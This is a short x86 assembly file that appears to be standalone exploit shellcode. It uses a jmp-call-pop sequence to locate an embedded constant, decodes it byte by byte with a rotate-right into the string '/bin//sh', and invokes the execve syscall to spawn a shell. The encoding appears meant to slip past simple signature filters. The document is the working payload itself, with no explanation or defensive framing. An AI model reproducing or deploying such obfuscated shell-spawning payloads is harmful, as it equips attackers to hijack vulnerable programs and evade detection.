BITS 32

global _start
_start:
	xor ecx,ecx
	imul ecx
	push ecx
	add al, 0xb
	jmp short _two
	_one:
		pop esi
		mov edi, esi
		pushad
		mov cl, 0x8
		_mangle:
			mov al, [esi]
			ror al, 0x2
			stosb
			inc esi
			loop _mangle
	popad
	xchg esp,esi
	xchg ebx,esp
	int 0x80
	_two:
		call _one
		dq 0xa1cdbcbcb9a589bc 
